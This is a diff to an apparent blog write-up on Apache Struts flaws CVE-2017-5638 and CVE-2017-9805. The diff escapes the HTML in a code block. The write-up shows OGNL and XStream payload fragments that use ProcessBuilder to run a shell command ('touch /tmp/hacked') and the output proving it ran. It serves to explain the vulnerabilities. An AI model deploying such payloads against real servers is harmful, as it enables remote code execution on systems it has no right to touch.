@@ -27,12 +27,12 @@
 "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
 "(#p=new java.lang.ProcessBuilder(#cmds))."</code></pre>
 	<p>More critically however, further to this CVE, Apache Struts also announced another vulnerability earlier this year (<a href="https://nvd.nist.gov/vuln/detail/CVE-2017-9805">CVE-2017-9805</a>), which works by delivering a payload against the REST plugin combined with the Xstream handler, which provides an XML ingest capability. By delivering an specially crafted XML payload, a shell command can be embedded, and will be executed.</p>
-	<pre class="language-bash"><code class="language-bash"><next class="java.lang.ProcessBuilder">
-   <command></command>
+	<pre class="language-bash"><code class="language-bash">&lt;next class="java.lang.ProcessBuilder"&gt;
+   &lt;command&gt;
       "touch /tmp/hacked".
-   
-   <redirecterrorstream>false</redirecterrorstream>
-</next></code></pre>
+   &lt;/command&gt;
+   &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;
+&lt;/next&gt;</code></pre>
 	<p>And the result from the test:</p>
 	<pre class="language-bash"><code class="language-bash">root@struts-demo:~$ ls /tmp
 hacked
